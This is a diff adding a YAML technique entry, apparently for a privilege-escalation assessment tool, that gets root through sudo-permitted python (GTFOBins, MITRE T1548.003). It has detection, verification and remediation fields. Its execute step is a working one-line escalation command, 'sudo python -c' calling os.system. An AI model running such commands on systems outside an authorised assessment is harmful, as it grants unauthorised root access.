@@ -1,0 +1,24 @@
+# Sudo → root via python (GTFOBins)
+# Modeled on privesc.GTFO["python"]["sudo"]. Python interpreted via sudo
+# gives arbitrary system() as root.
+technique: T1548.003
+name: Sudo → root via python (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  sudo_allows: python
+execute:
+  command: 'sudo python -c ''import os;os.system("id")'''
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_sudo
+  description: Sudo NOPASSWD on `python` is arbitrary-code as root via `os.system`.
+  remediation: Drop `python` from sudoers.
+  refs: [T1548.003, GTFOBins/python]
